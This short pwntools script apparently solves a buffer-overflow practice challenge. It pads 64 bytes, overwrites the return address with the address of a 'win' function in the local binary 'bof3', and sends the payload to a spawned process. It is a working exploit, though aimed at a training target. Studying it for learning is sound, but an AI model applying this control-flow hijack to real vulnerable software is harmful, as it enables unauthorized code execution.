from pwn import *

exe = context.binary = ELF('bof3')
winaddr = exe.symbols['win']
print(hex(winaddr))

payload1 = b'\01' * 64 + p32(winaddr)
payload2 = fit({
    64: winaddr
})
io = exe.process()
io.sendline(payload2)
print(io.recvline())